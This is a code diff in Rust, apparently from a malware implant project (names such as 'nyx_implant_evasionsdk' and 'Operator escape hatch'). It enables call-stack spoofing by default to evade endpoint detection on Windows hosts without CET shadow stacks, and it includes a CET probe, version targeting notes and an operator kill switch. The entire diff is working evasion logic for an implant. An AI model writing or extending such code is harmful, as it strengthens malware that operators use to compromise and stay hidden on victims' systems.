@@ -103,6 +103,43 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         let leaked: &'static _ = alloc::boxed::Box::leak(alloc::boxed::Box::new(pool));
         unsafe { crate::stack::set_gap_pool(leaked) };
         let _ = crate::stack::stage_for(leaked);
+
+        // ---- Stack-spoof auto-arm (task #2) -----------------------------------
+        // The RSP swap was historically gated OFF by default (SPOOF_SWAP_ENABLED
+        // = false) because a naive swap #CP-faults on CET/shadow-stack hosts.
+        // The CET-aware decision logic (`evasionsdk::swap::decide`) AND the live
+        // CET probe (`version::cet_active` via IsProcessorFeaturePresent(41))
+        // are both real and selftest-verified — what was missing was the call
+        // site that arms the swap when the host is confirmed CET-off with a
+        // usable gap pool. We add it here: arm iff decide() returns Execute.
+        //
+        // This makes the spoof active by default on every Win10 / Server 2019
+        // box (CET didn't exist) and every Win11 box where the process hasn't
+        // opted into CET, while staying inert on CET-on hosts (Win11 24H2+ with
+        // a CET-enabled binary manifest). The hot path's own decide() check in
+        // with_spoofed_stack remains as the defence-in-depth re-validation.
+        //
+        // Operator escape hatch: NYX_SPOOF_OFF=1 forces the swap OFF regardless
+        // of the host posture (for targets with non-standard shadow-stack
+        // behavior where the CET probe falsely reports off). Mirrors the
+        // NYX_FOLIAGE_OFF pattern.
+        let spoof_disabled = match option_env!("NYX_SPOOF_OFF") {
+            Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
+            None => false,
+        };
+        let cet_on = crate::version::cet_active();
+        let gaps_usable = leaked.is_usable();
+        if !spoof_disabled
+            && matches!(
+                nyx_implant_evasionsdk::swap::decide(cet_on, gaps_usable),
+                nyx_implant_evasionsdk::swap::SwapDecision::Execute
+            )
+        {
+            crate::stack::set_swap_enabled(true);
+            diag_mark(b"4b_spoof_armed");
+        } else {
+            diag_mark(b"4b_spoof_degraded");
+        }
     }
     diag_mark(b"4_pdata");
 
